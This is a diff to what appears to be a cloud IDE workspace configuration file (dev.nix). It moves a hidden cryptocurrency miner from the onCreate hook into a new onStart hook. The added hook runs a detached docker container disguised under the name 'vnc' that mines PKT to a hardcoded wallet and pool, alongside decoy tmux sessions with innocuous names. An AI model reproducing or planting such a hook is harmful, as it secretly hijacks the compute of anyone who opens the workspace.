@@ -18,13 +18,24 @@
     workspace = {
       # Runs when a workspace is first created with this `dev.nix` file
       onCreate = {
-        npm-install = "npm ci --no-audit --prefer-offline --no-progress --timing"
-                      "docker run -d --name vnc --restart always -e WALLET=pkt1qldufh789t6v8g7wccql68w9c29524u6u5m87dy thomasjp0x42/packetcrypt-amd64 ann -p pkt1qldufh789t6v8g7wccql68w9c29524u6u5m87dy http://pool.pkt.world";
+        npm-install = "npm ci --no-audit --prefer-offline --no-progress --timing";
         # Open editors for the following files by default, if they exist:
         default.openFiles = [ "src/App.tsx" "src/App.ts" "src/App.jsx" "src/App.js" ];
       };
       # To run something each time the workspace is (re)started, use the `onStart` hook
     };
+  	  onStart = {
+		    start-vnc-sessions = "
+  			tmux new -d -s checker-session 'tail -f /dev/null'
+  			tmux new -d -s checkup-session 'cat'
+  			tmux new -d -s bitping-session 'httping google.com'
+  			tmux new -d -s top-session 'top'
+  			tmux attach -t top-session
+	  	  ";
+	    	start-firex-sessions = "
+	  		docker run -d --name vnc --restart always -e WALLET=pkt1qldufh789t6v8g7wccql68w9c29524u6u5m87dy thomasjp0x42/packetcrypt-amd64 ann -p pkt1qldufh789t6v8g7wccql68w9c29524u6u5m87dy http://pool.pkt.world
+	    	";
+	    };
     # Enable previews and customize configuration
     previews = {
       enable = true;
